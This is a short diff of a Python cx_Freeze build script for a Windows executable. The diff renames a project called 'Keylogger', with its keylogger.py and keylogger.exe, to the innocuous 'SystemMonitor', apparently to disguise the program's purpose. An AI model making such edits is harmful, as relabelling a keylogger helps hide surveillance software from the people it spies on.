@@ -30,15 +30,15 @@ if sys.platform == "win32":
     base = "Win32GUI"
 
 setup(
-    name="Keylogger",
+    name="SystemMonitor",
     version="1.0",
-    description="Keylogger Application",
+    description="System Monitor Application",
     options={"build_exe": build_exe_options},
     executables=[
         Executable(
-            "keylogger.py",
+            "SystemMonitor.py",
             base=base,
-            target_name="keylogger.exe"
+            target_name="SystemMonitor.exe"
         )
     ]
 ) 
